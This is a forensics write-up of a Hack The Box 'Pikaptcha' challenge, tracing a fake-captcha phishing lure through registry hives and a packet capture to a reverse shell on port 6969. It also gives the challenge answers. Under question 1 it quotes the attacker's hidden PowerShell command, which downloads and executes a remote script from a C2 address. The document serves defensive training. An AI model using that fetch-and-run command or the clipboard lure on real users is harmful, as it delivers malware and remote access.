# HTB Sherlock - Pikaptcha

![htb logo](./Images/htb_logo.png)

| Date       | Author          | Difficulty | Challenge Type |
| ---------- | --------------- | ---------- | -------------- |
| 2025-09-09 | Andrew McKenzie | Easy       | DFIR           |

---
## Description
This challenge involves a classic phishing investigation that requires correlating endpoint and network artifacts. After a user is lured to a malicious site with a fake captcha, a payload is executed. The goal is to analyze registry hives and a packet capture to trace the attack from initial execution to the establishment of a C2 reverse shell.
## Scenario
Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.
## Artifacts Provided
- Pikaptcha.zip
	- pikaptcha.pcapng
	- 2024-09-23T052209_alert_mssp_action.zip

| Filename                                | Algorithm | Hash                                                             |
| --------------------------------------- | --------- | ---------------------------------------------------------------- |
| pikaptcha.pcapng                        | SHA256    | E928CB27491A01766A44DEA626357DEEF30E9A60B6BCB3FA8DA4C4D7F6083BDA |
| pikaptcha.pcapng                        | SHA1      | 1FD3E3B9D70305DD4047833D2CE3C9E4B165FA65                         |
| pikaptcha.pcapng                        | MD5       | 1DAA25D85B80C3EC05AF0FF211FE8803                                 |
| 2024-09-23T052209_alert_mssp_action.zip | SHA256    | BE61F277197D3DABC75A298FA9F6CC8F833FF05B4CF5C55CC24ACA9307E4491B |
| 2024-09-23T052209_alert_mssp_action.zip | SHA1      | C38EDE845392F0D88DBA716C72596D178B22BA24                         |
| 2024-09-23T052209_alert_mssp_action.zip | MD5       | 12D1B26ADA9D62227DBD051C073BB0AA                                 |
## Skills Learned
- **Endpoint & Network Correlation:** Linking evidence from host-based artifacts (Windows Registry) with network traffic (PCAP) to build a complete picture of an attack.
- **Registry Forensics:** Analyzing Run/RunMRU keys to uncover commands executed by a user, identifying persistence or initial access payloads.
- **PCAP Analysis with Wireshark:** Filtering traffic by IP, exporting HTTP objects (file carving), and following TCP streams to analyze C2 communications.
- **C2 Traffic Identification:** Recognizing reverse shell activity by identifying long-lived TCP sessions on non-standard ports.
- **Static Web Page Analysis:** Inspecting the source code of a malicious web page from captured traffic to identify malicious functions.
## Initial Analysis
The investigation began by examining the endpoint artifacts, focusing on the registry hives of the user `happy.grunwald`. This immediately yielded the initial access vector.
1. **Initial Execution:** Analysis of the **RunMRU registry key** revealed a PowerShell command that was executed at **05:07:45 UTC**. This command used `Net.WebClient` to download and execute a script named `office2024install.ps1` from the attacker's server at `43.205.115.44`.
2. **Payload Analysis:** The investigation pivoted to the `pikaptcha.pcapng` network capture. The PowerShell script was successfully carved from the HTTP traffic, and its **SHA256 hash** was calculated.
3. **C2 Communication:** By filtering the network traffic for the attacker's IP, a persistent TCP connection was identified on port **6969**. This connection, characteristic of a reverse shell, was established shortly after the payload execution and lasted for **403 seconds**.
4. **Social Engineering:** To understand how the user was tricked into running the initial command, the HTTP traffic leading to the attack was inspected. Following the HTTP stream revealed a fake captcha page. The page's source code contained a JavaScript function named **`stageClipboard`**, which was designed to copy the malicious PowerShell command into the victim's clipboard, likely instructing them to paste and run it to "complete" the captcha.
## Questions:
1. **It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.**
The information provided by the question gears us towards looking into the user's specific registry keys. After checking multiple spots, we can eventually find the item in question in the RuNMRU key. The answer is `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`.

![image one](./Images/Pasted%20image%2020250909172225.png)

2. **At what time in UTC did the malicious payload execute?**
This answer can be found in the same place as the previous question. The answer is `2024-09-23 05:07:45`.

![image two](./Images/Pasted%20image%2020250909172412.png)

3. **The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?**
We can get the script from Wireshark by going to File > Export Objects > HTTP, then we can filter the results by typing in the IP address we found in question 1. Once we see the appropriate file name, you can save it locally and get its hash. The answer is `579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE`.

![image three](./Images/Pasted%20image%2020250909172914.png)

4. **To which port did the reverse shell connect?**
Filtering Wireshark for the IP addresses known now, `p.addr == 43.205.115.44 && ip.dst == 172.17.79.129`, we see some ports being used that are odd, particularly `6969`.

![image four](./Images/Pasted%20image%2020250909173039.png)

5. **For how many seconds was the reverse shell connection established between C2 and the victim's workstation?**
For this question, we just need to filter with the newfound information and then grab the start time `2024-09-23 05:07:48` and the last communication time `2024-09-23 05:14:31`, and then find the value in seconds between those two timestamps. The answer is `403`.

6. **Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?**
We can modify our filter to go back to just filtering for the malicious IP address. From there we can then follow the HTTP stream. The function in question is `stageClipboard`.

![image five](./Images/Pasted%20image%2020250909173800.png)